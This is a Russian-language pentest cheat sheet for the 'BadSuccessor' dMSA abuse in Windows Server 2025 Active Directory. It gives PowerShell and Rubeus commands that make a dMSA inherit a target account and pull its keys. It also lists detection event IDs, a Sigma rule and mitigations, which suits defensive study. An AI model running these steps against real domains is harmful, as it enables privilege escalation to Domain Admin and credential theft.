# BadSuccessor — Abusing dMSA for Privilege Escalation in Active Directory

**Предупреждение:** Используйте только в авторизованных тестах. Уязвимость в Windows Server 2025; применяйте патчи.

## 🎯 Цель атаки
Эскалация привилегий до любого пользователя в AD, включая Domain Admins, через abuse delegated Managed Service Accounts (dMSAs).

## 📋 Условия
- Windows Server 2025 DC в домене.
- Права на создание или write-доступ к dMSA (e.g., "Create msDS-DelegatedManagedServiceAccount" на OU).
- Нет прав на целевой аккаунт.

## 🔹 Почему Это Работает
Эксплуатирует миграцию dMSA: установка msDS-ManagedAccountPrecededByLink и msDS-DelegatedMSAState=2 заставляет KDC считать dMSA преемником цели, добавляя SID/группы в PAC TGT.

## 🔹 Пошагово
1. Найти OU с правами на создание dMSA (BloodHound или PowerShell).
```powershell
New-ADServiceAccount -Name "BadDMSA" -Path "OU=Test,DC=domain,DC=local"
```

2. Предоставить write-доступ к атрибутам dMSA.
3. Модифицировать атрибуты:
```powershell
Set-ADServiceAccount -Identity "BadDMSA" -Replace @{'msDS-ManagedAccountPrecededByLink'='CN=TargetUser,DC=domain,DC=local'; 'msDS-DelegatedMSAState'=2}
```

4. Запросить TGT для dMSA (Rubeus):
```bash
Rubeus.exe tgtdeleg /user:BadDMSA$
```
5. PAC в TGT включает SID цели; извлечь ключи из KERB-DMSA-KEY-PACKAGE.

Потенциальная ошибка: "Access Denied" — проверьте права; KRB-ERROR при неверной конфигурации.
📊 SIEM

Event ID 5137: Создание dMSA.
Event ID 5136: Изменение msDS-ManagedAccountPrecededByLink.
Event ID 2946: TGT для dMSA с Caller SID S-1-5-7.
Sigma Rule: detection: EventID: 5136 AND AttributeLDAPDisplayName: msDS-ManagedAccountPrecededByLink

🛡 Защита

Ограничить права на создание dMSA.
Логировать SACL на dMSA-атрибуты.
Использовать скрипт: https://github.com/akamai/BadSuccessor для аудита.
Установить патч от Microsoft.

📌 Вариации

Контроль существующего dMSA; извлечение ключей цели для credential dump.

